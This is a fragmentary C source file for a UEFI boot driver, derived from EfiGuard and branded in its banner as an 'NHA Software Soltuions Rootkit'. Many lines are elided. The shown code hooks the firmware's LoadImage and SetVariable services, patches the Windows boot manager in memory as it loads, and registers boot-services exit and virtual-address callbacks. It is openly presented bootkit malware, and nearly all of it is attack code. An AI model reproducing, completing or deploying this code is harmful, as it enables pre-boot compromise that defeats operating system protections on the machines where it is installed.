...
// Driver unload
//
EFI_STATUS EFIAPI EfiGuardUnload(IN EFI_HANDLE ImageHandle);

//
// EfiGuard driver protocol
//
EFI_STATUS EFIAPI DriverConfigure(IN CONST EFIGUARD_CONFIGURATION_DATA* ConfigurationData);
...
L"\r\n    |_|\\_||_||_|/_/ \\_\\                    " \
L"\r\n                                           " \
L"\r\n    NHA Software Soltuions Rootkit - 2023 \r\n"
...
//
EFI_STATUS EFIAPI HookedLoadImage(IN BOOLEAN BootPolicy,IN EFI_HANDLE ParentImageHandle,IN EFI_DEVICE_PATH_PROTOCOL *DevicePath,IN VOID *SourceBuffer OPTIONAL,IN UINTN SourceSize,OUT EFI_HANDLE *ImageHandle){
// Try to get a readable file path from the EFI shell protocol if it's available
EFI_SHELL_PROTOCOL* EfiShellProtocol = NULL;
CONST EFI_STATUS EfiShellStatus = gBS->LocateProtocol(&gEfiShellProtocolGuid,NULL,(VOID**)&EfiShellProtocol);
...
// Load the image
CONST EFI_STATUS Status = mOriginalLoadImage(BootPolicy,ParentImageHandle,DevicePath,SourceBuffer,SourceSize,ImageHandle);
...
CONST EFI_STATUS ImageInfoStatus = gBS->OpenProtocol(*ImageHandle,&gEfiLoadedImageProtocolGuid,(VOID**)&LoadedImage,gImageHandle,NULL,EFI_OPEN_PROTOCOL_GET_PROTOCOL);
...
// Nuke it dot it
PatchBootManager(FileType,LoadedImage->ImageBase,LoadedImage->ImageSize);
}else{
...
//
EFI_STATUS EFIAPI HookedSetVariable(IN CHAR16 *VariableName,IN EFI_GUID *VendorGuid,IN UINT32 Attributes,IN UINTN DataSize,IN VOID *Data){
...
gBS->UninstallMultipleProtocolInterfaces(gImageHandle,&gEfiGuardDriverProtocolGuid,&gEfiGuardDriverProtocol,&gEfiDriverSupportedEfiVersionProtocolGuid,&gEfiGuardSupportedEfiVersion,NULL);
...
// Main entry point
// 
EFI_STATUS EFIAPI EfiGuardInitialize(IN EFI_HANDLE ImageHandle,IN EFI_SYSTEM_TABLE *SystemTable){
...
//
Status = gBS->InstallMultipleProtocolInterfaces(&gImageHandle,&gEfiDriverSupportedEfiVersionProtocolGuid,&gEfiGuardSupportedEfiVersion,NULL);
...
//
Status = gBS->InstallProtocolInterface(&gImageHandle,&gEfiGuardDriverProtocolGuid,EFI_NATIVE_INTERFACE,&gEfiGuardDriverProtocol);
if (EFI_ERROR(Status))
goto Exit;
...
Print(L"\r\n\r\n");
Print(L"%S", BOOT_TITLE);
//Print(L"%S", EFIGUARD_TITLE2);
gST->ConOut->SetAttribute(gST->ConOut, OriginalAttribute);

EFI_LOADED_IMAGE_PROTOCOL *LocalImageInfo;
Status = gBS->OpenProtocol(gImageHandle,&gEfiLoadedImageProtocolGuid,(VOID**)&LocalImageInfo,gImageHandle,NULL,EFI_OPEN_PROTOCOL_GET_PROTOCOL);
if (EFI_ERROR(Status))
goto Exit;
...
Status = gBS->CreateEventEx(EVT_NOTIFY_SIGNAL,TPL_NOTIFY,ExitBootServicesEvent,NULL,&gEfiEventExitBootServicesGuid,&gEfiExitBootServicesEvent);
if (EFI_ERROR(Status))
goto Exit;

// Register notification callback for SetVirtualAddressMap()
Status = gBS->CreateEventEx(EVT_NOTIFY_SIGNAL,TPL_NOTIFY,SetVirtualAddressMapEvent,NULL,&gEfiEventVirtualAddressChangeGuid,&gEfiVirtualNotifyEvent);
if (EFI_ERROR(Status))
goto Exit;
...
Exit:
if (EFI_ERROR(Status)){
Print(L"\r\nNHA_EFI initialization failed with status %llx (%r)\r\n", Status, Status);
